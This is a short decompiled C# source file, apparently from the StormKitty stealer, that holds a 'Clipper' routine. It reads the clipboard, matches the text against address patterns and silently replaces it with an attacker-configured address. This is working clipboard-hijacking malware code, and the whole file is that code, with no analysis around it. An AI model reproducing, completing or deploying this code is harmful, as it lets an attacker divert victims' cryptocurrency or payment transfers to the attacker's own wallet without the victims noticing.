﻿using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using StormKitty;

namespace Clipper
{
	// Token: 0x02000053 RID: 83
	internal sealed class Clipper
	{
		// Token: 0x06000131 RID: 305 RVA: 0x000090E8 File Offset: 0x000072E8
		public static void Replace()
		{
			string clipboardText = ClipboardManager.ClipboardText;
			if (string.IsNullOrEmpty(clipboardText))
			{
				return;
			}
			foreach (KeyValuePair<string, Regex> keyValuePair in RegexPatterns.PatternsList)
			{
				string key = keyValuePair.Key;
				if (keyValuePair.Value.Match(clipboardText).Success)
				{
					string text = Config.ClipperAddresses[key];
					if (!string.IsNullOrEmpty(text) && !clipboardText.Equals(text))
					{
						Clipboard.SetText(text);
						Console.WriteLine("Clipper replaced to " + text);
						break;
					}
				}
			}
		}
	}
}
